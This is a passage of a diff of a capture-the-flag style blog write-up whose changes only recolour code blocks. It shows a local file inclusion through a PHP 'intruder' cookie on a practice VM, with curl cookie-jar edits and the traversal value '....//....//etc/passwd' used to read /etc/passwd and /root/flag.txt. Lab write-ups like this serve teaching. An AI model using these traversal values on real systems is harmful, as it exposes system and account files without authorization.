 <p>Back to <code>check.php</code>, it was time to check for any potential SQL injection on the post to <code>check.php</code> from the login form. Nope. Nothing like that. However, while messing around I noticed that this script was setting a new cookie <code>failcount</code>. failcount would increment with every incorrect login to <code>check.php</code>. After <em>3</em> failed attempts, another cookie called <code>intruder</code> was set:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Added cookie intruder<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1&#34;</span> <span style="color:#66d9ef">for</span> domain 192.168.56.102, path /super_secret_login_path_muhahaha/, expire <span style="color:#ae81ff">0</span>
-&gt; Cookie: intruder<span style="color:#f92672">=</span>1; failcount<span style="color:#f92672">=</span>4; PHPSESSID<span style="color:#f92672">=</span>8u300rbb0747fi6iocm0lt4310
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Added cookie <span style="color:#8be9fd;font-style:italic">intruder</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1&#34;</span> <span style="color:#ff79c6">for</span> domain 192.168.56.102, path /super_secret_login_path_muhahaha/, expire <span style="color:#bd93f9">0</span>
+&gt; Cookie: <span style="color:#8be9fd;font-style:italic">intruder</span><span style="color:#ff79c6">=</span>1; <span style="color:#8be9fd;font-style:italic">failcount</span><span style="color:#ff79c6">=</span>4; <span style="color:#8be9fd;font-style:italic">PHPSESSID</span><span style="color:#ff79c6">=</span>8u300rbb0747fi6iocm0lt4310
 </code></pre></div><p>Again I will admit this did not jump right out at me. In fact it took quite a few more requests to finally puzzle it together. However, I finally nailed it when a request without the -L (follow redirects) flag was set for <code>panel.php</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&lt;HTML&gt;
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&lt;HTML&gt;
 &lt;CENTRE&gt;
 &lt;H2&gt; Folders &lt;/H2&gt;
-&lt;TABLE style<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width:700px&#34;</span> align<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;center&#34;</span>&gt;
+&lt;TABLE <span style="color:#8be9fd;font-style:italic">style</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;width:700px&#34;</span> <span style="color:#8be9fd;font-style:italic">align</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;center&#34;</span>&gt;
 &lt;TR&gt;
-   &lt;TD&gt;&lt;A HREF<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;server.php&#34;</span>&gt;&lt;IMG SRC<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
-   &lt;TD&gt;&lt;A HREF<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mail.php&#34;</span>&gt;&lt;IMG SRC<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
-   &lt;TD&gt;&lt;A HREF<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;users.php&#34;</span>&gt;&lt;IMG SRC<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
-   &lt;TD&gt;&lt;A HREF<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;personal.php&#34;</span>&gt;&lt;IMG SRC<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
-   &lt;TD&gt;&lt;A HREF<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;notes.php&#34;</span>&gt;&lt;IMG SRC<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
+   &lt;TD&gt;&lt;A <span style="color:#8be9fd;font-style:italic">HREF</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;server.php&#34;</span>&gt;&lt;IMG <span style="color:#8be9fd;font-style:italic">SRC</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
+   &lt;TD&gt;&lt;A <span style="color:#8be9fd;font-style:italic">HREF</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;mail.php&#34;</span>&gt;&lt;IMG <span style="color:#8be9fd;font-style:italic">SRC</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
+   &lt;TD&gt;&lt;A <span style="color:#8be9fd;font-style:italic">HREF</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;users.php&#34;</span>&gt;&lt;IMG <span style="color:#8be9fd;font-style:italic">SRC</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
+   &lt;TD&gt;&lt;A <span style="color:#8be9fd;font-style:italic">HREF</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;personal.php&#34;</span>&gt;&lt;IMG <span style="color:#8be9fd;font-style:italic">SRC</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
+   &lt;TD&gt;&lt;A <span style="color:#8be9fd;font-style:italic">HREF</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;notes.php&#34;</span>&gt;&lt;IMG <span style="color:#8be9fd;font-style:italic">SRC</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
 &lt;/TR&gt;
 &lt;TR&gt;
    &lt;TD&gt;&lt;H4&gt;Server Status&lt;/H4&gt;&lt;/TD&gt;
@@ -393,43 +362,43 @@ ID Response   Lines      Word         Chars          Request
 &lt;/CENTRE&gt;
 &lt;HTML&gt;
 &lt;CENTER&gt;
-&lt;FONT COLOR <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;RED&#34;</span>&gt;
+&lt;FONT <span style="color:#8be9fd;font-style:italic">COLOR</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;RED&#34;</span>&gt;
 &lt;H1&gt;INTRUDER ALERT!&lt;/H1&gt;
 &lt;/FONT&gt;
 &lt;/CENTER&gt;
 &lt;/HTML&gt;
 &lt;/HTML&gt;
 </code></pre></div><p>Notice the familiar <strong>INTRUDER ALERT</strong> message? :) Also remember how this file was called <code>/1</code> from the previous enumeration? Yep! File Include time! With us having a cookiejar file called <code>cookies</code> available for editing, it was easy to play around with this. The normal cookiejar had:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# cat cookies
-<span style="color:#75715e"># Netscape HTTP Cookie File</span>
-<span style="color:#75715e"># http://curl.haxx.se/rfc/cookie_spec.html</span>
-<span style="color:#75715e"># This file was generated by libcurl! Edit at your own risk.</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# cat cookies
+<span style="color:#6272a4"># Netscape HTTP Cookie File</span>
+<span style="color:#6272a4"># http://curl.haxx.se/rfc/cookie_spec.html</span>
+<span style="color:#6272a4"># This file was generated by libcurl! Edit at your own risk.</span>
 
-192.168.56.102 FALSE /  FALSE <span style="color:#ae81ff">0</span>  PHPSESSID   8u300rbb0747fi6iocm0lt4310
-192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE <span style="color:#ae81ff">0</span>  failcount   <span style="color:#ae81ff">4</span>
-192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE <span style="color:#ae81ff">0</span>  intruder <span style="color:#ae81ff">1</span>
+192.168.56.102 FALSE /  FALSE <span style="color:#bd93f9">0</span>  PHPSESSID   8u300rbb0747fi6iocm0lt4310
+192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE <span style="color:#bd93f9">0</span>  failcount   <span style="color:#bd93f9">4</span>
+192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE <span style="color:#bd93f9">0</span>  intruder <span style="color:#bd93f9">1</span>
 </code></pre></div><p>To test the file include, the first knee jerk reaction was to replace the <code>1</code> with <code>/etc/passwd</code>. This yielded no results, and immediately I feared failure and assumptions disappointing me. However, just to make sure, I replaced it again with something in the same path as <code>/1</code>, like <code>mail.php</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# cat cookies
-<span style="color:#75715e"># Netscape HTTP Cookie File</span>
-<span style="color:#75715e"># http://curl.haxx.se/rfc/cookie_spec.html</span>
-<span style="color:#75715e"># This file was generated by libcurl! Edit at your own risk.</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# cat cookies
+<span style="color:#6272a4"># Netscape HTTP Cookie File</span>
+<span style="color:#6272a4"># http://curl.haxx.se/rfc/cookie_spec.html</span>
+<span style="color:#6272a4"># This file was generated by libcurl! Edit at your own risk.</span>
 
-192.168.56.102 FALSE /  FALSE <span style="color:#ae81ff">0</span>  PHPSESSID   8u300rbb0747fi6iocm0lt4310
-192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE <span style="color:#ae81ff">0</span>  failcount   <span style="color:#ae81ff">4</span>
-192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE <span style="color:#ae81ff">0</span>  intruder ./mail.php
+192.168.56.102 FALSE /  FALSE <span style="color:#bd93f9">0</span>  PHPSESSID   8u300rbb0747fi6iocm0lt4310
+192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE <span style="color:#bd93f9">0</span>  failcount   <span style="color:#bd93f9">4</span>
+192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE <span style="color:#bd93f9">0</span>  intruder ./mail.php
 
 root@kali:~# curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php -c cookies -b cookies
 
 &lt;HTML&gt;
 &lt;CENTRE&gt;
 &lt;H2&gt; Folders &lt;/H2&gt;
-&lt;TABLE style<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width:700px&#34;</span> align<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;center&#34;</span>&gt;
+&lt;TABLE <span style="color:#8be9fd;font-style:italic">style</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;width:700px&#34;</span> <span style="color:#8be9fd;font-style:italic">align</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;center&#34;</span>&gt;
 &lt;TR&gt;
-   &lt;TD&gt;&lt;A HREF<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;server.php&#34;</span>&gt;&lt;IMG SRC<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
-   &lt;TD&gt;&lt;A HREF<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mail.php&#34;</span>&gt;&lt;IMG SRC<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
-   &lt;TD&gt;&lt;A HREF<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;users.php&#34;</span>&gt;&lt;IMG SRC<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
-   &lt;TD&gt;&lt;A HREF<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;personal.php&#34;</span>&gt;&lt;IMG SRC<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
-   &lt;TD&gt;&lt;A HREF<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;notes.php&#34;</span>&gt;&lt;IMG SRC<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
+   &lt;TD&gt;&lt;A <span style="color:#8be9fd;font-style:italic">HREF</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;server.php&#34;</span>&gt;&lt;IMG <span style="color:#8be9fd;font-style:italic">SRC</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
+   &lt;TD&gt;&lt;A <span style="color:#8be9fd;font-style:italic">HREF</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;mail.php&#34;</span>&gt;&lt;IMG <span style="color:#8be9fd;font-style:italic">SRC</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
+   &lt;TD&gt;&lt;A <span style="color:#8be9fd;font-style:italic">HREF</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;users.php&#34;</span>&gt;&lt;IMG <span style="color:#8be9fd;font-style:italic">SRC</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
+   &lt;TD&gt;&lt;A <span style="color:#8be9fd;font-style:italic">HREF</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;personal.php&#34;</span>&gt;&lt;IMG <span style="color:#8be9fd;font-style:italic">SRC</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
+   &lt;TD&gt;&lt;A <span style="color:#8be9fd;font-style:italic">HREF</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;notes.php&#34;</span>&gt;&lt;IMG <span style="color:#8be9fd;font-style:italic">SRC</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
 &lt;/TR&gt;
 &lt;TR&gt;
    &lt;TD&gt;&lt;H4&gt;Server Status&lt;/H4&gt;&lt;/TD&gt;
@@ -440,37 +409,37 @@ root@kali:~# curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.p
 &lt;/TR&gt;
 &lt;/CENTRE&gt;
 &lt;HTML&gt;
-&lt;H3&gt; Email<span style="color:#960050;background-color:#1e0010">&#39;</span>s recieved in the last <span style="color:#ae81ff">24</span> hours: &lt;/H3&gt;2&lt;BR&gt;
+&lt;H3&gt; Email&#39;s recieved in the last <span style="color:#bd93f9">24</span> hours: &lt;/H3&gt;2&lt;BR&gt;
 &lt;H3&gt; Current Status: Firewall Activated &lt;/H3&gt;&lt;BR&gt;
-&lt;IMG SRC<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://i.imgur.com/JjipeOj.gif&#34;</span>&gt;
+&lt;IMG <span style="color:#8be9fd;font-style:italic">SRC</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://i.imgur.com/JjipeOj.gif&#34;</span>&gt;
 &lt;/HTML&gt;
 &lt;/HTML&gt;
 </code></pre></div><p>YES. It <strong>does</strong> work! We have the same output added to the <code>panel.php</code> output as we would have if we browsed directly to <code>mail.php</code>. By now the assumption was that the code had something like:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span> ($_COOKIE[<span style="color:#e6db74">&#39;intruder&#39;</span>]) {
-   <span style="color:#66d9ef">include</span>($_COOKIE[<span style="color:#e6db74">&#39;intruder&#39;</span>]);
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#ff79c6">if</span> (<span style="color:#8be9fd;font-style:italic">$_COOKIE</span>[<span style="color:#f1fa8c">&#39;intruder&#39;</span>]) {
+   <span style="color:#ff79c6">include</span>(<span style="color:#8be9fd;font-style:italic">$_COOKIE</span>[<span style="color:#f1fa8c">&#39;intruder&#39;</span>]);
 }
 </code></pre></div><p>&hellip;with some kind of filtering preventing reading the <code>/etc/passwd</code>. While I was still pretty excited about finding this vuln, I soon came across <a href="https://www.owasp.org/index.php/Testing_for_Path_Traversal_(OWASP-AZ-001)#Gray_Box_testing_and_example">this</a> article detailing potential ways of bypassing directory traversal vulnerabilities. After reading this I promptly changed the <code>intruder</code> cookie to <code>....//....//....//....//....//etc/passwd</code> and viola! :)</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# cat cookies
-<span style="color:#75715e"># Netscape HTTP Cookie File</span>
-<span style="color:#75715e"># http://curl.haxx.se/rfc/cookie_spec.html</span>
-<span style="color:#75715e"># This file was generated by libcurl! Edit at your own risk.</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# cat cookies
+<span style="color:#6272a4"># Netscape HTTP Cookie File</span>
+<span style="color:#6272a4"># http://curl.haxx.se/rfc/cookie_spec.html</span>
+<span style="color:#6272a4"># This file was generated by libcurl! Edit at your own risk.</span>
 
-192.168.56.102 FALSE /  FALSE <span style="color:#ae81ff">0</span>  PHPSESSID   8u300rbb0747fi6iocm0lt4310
-192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE <span style="color:#ae81ff">0</span>  failcount   <span style="color:#ae81ff">4</span>
-192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE <span style="color:#ae81ff">0</span>  intruder ....//....//....//....//....//etc/passwd
+192.168.56.102 FALSE /  FALSE <span style="color:#bd93f9">0</span>  PHPSESSID   8u300rbb0747fi6iocm0lt4310
+192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE <span style="color:#bd93f9">0</span>  failcount   <span style="color:#bd93f9">4</span>
+192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE <span style="color:#bd93f9">0</span>  intruder ....//....//....//....//....//etc/passwd
 
 root@kali:~# curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php -c cookies -b cookies
 
 &lt;HTML&gt;
 &lt;CENTRE&gt;
 &lt;H2&gt; Folders &lt;/H2&gt;
-&lt;TABLE style<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width:700px&#34;</span> align<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;center&#34;</span>&gt;
+&lt;TABLE <span style="color:#8be9fd;font-style:italic">style</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;width:700px&#34;</span> <span style="color:#8be9fd;font-style:italic">align</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;center&#34;</span>&gt;
 &lt;TR&gt;
-   &lt;TD&gt;&lt;A HREF<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;server.php&#34;</span>&gt;&lt;IMG SRC<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
-   &lt;TD&gt;&lt;A HREF<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mail.php&#34;</span>&gt;&lt;IMG SRC<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
-   &lt;TD&gt;&lt;A HREF<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;users.php&#34;</span>&gt;&lt;IMG SRC<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
-   &lt;TD&gt;&lt;A HREF<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;personal.php&#34;</span>&gt;&lt;IMG SRC<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
-   &lt;TD&gt;&lt;A HREF<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;notes.php&#34;</span>&gt;&lt;IMG SRC<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
+   &lt;TD&gt;&lt;A <span style="color:#8be9fd;font-style:italic">HREF</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;server.php&#34;</span>&gt;&lt;IMG <span style="color:#8be9fd;font-style:italic">SRC</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
+   &lt;TD&gt;&lt;A <span style="color:#8be9fd;font-style:italic">HREF</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;mail.php&#34;</span>&gt;&lt;IMG <span style="color:#8be9fd;font-style:italic">SRC</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
+   &lt;TD&gt;&lt;A <span style="color:#8be9fd;font-style:italic">HREF</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;users.php&#34;</span>&gt;&lt;IMG <span style="color:#8be9fd;font-style:italic">SRC</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
+   &lt;TD&gt;&lt;A <span style="color:#8be9fd;font-style:italic">HREF</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;personal.php&#34;</span>&gt;&lt;IMG <span style="color:#8be9fd;font-style:italic">SRC</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
+   &lt;TD&gt;&lt;A <span style="color:#8be9fd;font-style:italic">HREF</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;notes.php&#34;</span>&gt;&lt;IMG <span style="color:#8be9fd;font-style:italic">SRC</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
 &lt;/TR&gt;
 &lt;TR&gt;
    &lt;TD&gt;&lt;H4&gt;Server Status&lt;/H4&gt;&lt;/TD&gt;
@@ -496,7 +465,7 @@ www-data:x:33:33:www-data:/var/www:/bin/sh
 backup:x:34:34:backup:/var/backups:/bin/sh
 list:x:38:38:Mailing List Manager:/var/list:/bin/sh
 irc:x:39:39:ircd:/var/run/ircd:/bin/sh
-gnats:x:41:41:Gnats Bug-Reporting System <span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>:/var/lib/gnats:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System <span style="color:#ff79c6">(</span>admin<span style="color:#ff79c6">)</span>:/var/lib/gnats:/bin/sh
 nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
 libuuid:x:100:101::/var/lib/libuuid:/bin/sh
 Debian-exim:x:101:104::/var/spool/exim4:/bin/false
@@ -513,27 +482,27 @@ oj:x:1005:1005::/home/oj:/bin/sh
 &lt;/HTML&gt;
 root@kali:~#
 </code></pre></div><p>YEAH. That felt pretty darm good! Obviously not knowing all the steps needed to complete this VM, I figured I had come a pretty long way to finding the pot of gold. (Note the users in this file for later) During the enumeration I took a chance to include <code>/root/flag.txt</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# cat cookies
-<span style="color:#75715e"># Netscape HTTP Cookie File</span>
-<span style="color:#75715e"># http://curl.haxx.se/rfc/cookie_spec.html</span>
-<span style="color:#75715e"># This file was generated by libcurl! Edit at your own risk.</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# cat cookies
+<span style="color:#6272a4"># Netscape HTTP Cookie File</span>
+<span style="color:#6272a4"># http://curl.haxx.se/rfc/cookie_spec.html</span>
+<span style="color:#6272a4"># This file was generated by libcurl! Edit at your own risk.</span>
 
-192.168.56.102 FALSE /  FALSE <span style="color:#ae81ff">0</span>  PHPSESSID   8u300rbb0747fi6iocm0lt4310
-192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE <span style="color:#ae81ff">0</span>  failcount   <span style="color:#ae81ff">4</span>
-192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE <span style="color:#ae81ff">0</span>  intruder ....//....//....//....//....//root/flag.txt
+192.168.56.102 FALSE /  FALSE <span style="color:#bd93f9">0</span>  PHPSESSID   8u300rbb0747fi6iocm0lt4310
+192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE <span style="color:#bd93f9">0</span>  failcount   <span style="color:#bd93f9">4</span>
+192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE <span style="color:#bd93f9">0</span>  intruder ....//....//....//....//....//root/flag.txt
 
 root@kali:~# curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php -c cookies -b cookies
 
 &lt;HTML&gt;
 &lt;CENTRE&gt;
 &lt;H2&gt; Folders &lt;/H2&gt;
-&lt;TABLE style<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width:700px&#34;</span> align<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;center&#34;</span>&gt;
+&lt;TABLE <span style="color:#8be9fd;font-style:italic">style</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;width:700px&#34;</span> <span style="color:#8be9fd;font-style:italic">align</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;center&#34;</span>&gt;
 &lt;TR&gt;
-   &lt;TD&gt;&lt;A HREF<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;server.php&#34;</span>&gt;&lt;IMG SRC<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
-   &lt;TD&gt;&lt;A HREF<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mail.php&#34;</span>&gt;&lt;IMG SRC<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
-   &lt;TD&gt;&lt;A HREF<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;users.php&#34;</span>&gt;&lt;IMG SRC<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
-   &lt;TD&gt;&lt;A HREF<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;personal.php&#34;</span>&gt;&lt;IMG SRC<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
-   &lt;TD&gt;&lt;A HREF<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;notes.php&#34;</span>&gt;&lt;IMG SRC<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
+   &lt;TD&gt;&lt;A <span style="color:#8be9fd;font-style:italic">HREF</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;server.php&#34;</span>&gt;&lt;IMG <span style="color:#8be9fd;font-style:italic">SRC</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
+   &lt;TD&gt;&lt;A <span style="color:#8be9fd;font-style:italic">HREF</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;mail.php&#34;</span>&gt;&lt;IMG <span style="color:#8be9fd;font-style:italic">SRC</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
+   &lt;TD&gt;&lt;A <span style="color:#8be9fd;font-style:italic">HREF</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;users.php&#34;</span>&gt;&lt;IMG <span style="color:#8be9fd;font-style:italic">SRC</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
+   &lt;TD&gt;&lt;A <span style="color:#8be9fd;font-style:italic">HREF</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;personal.php&#34;</span>&gt;&lt;IMG <span style="color:#8be9fd;font-style:italic">SRC</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
+   &lt;TD&gt;&lt;A <span style="color:#8be9fd;font-style:italic">HREF</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;notes.php&#34;</span>&gt;&lt;IMG <span style="color:#8be9fd;font-style:italic">SRC</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
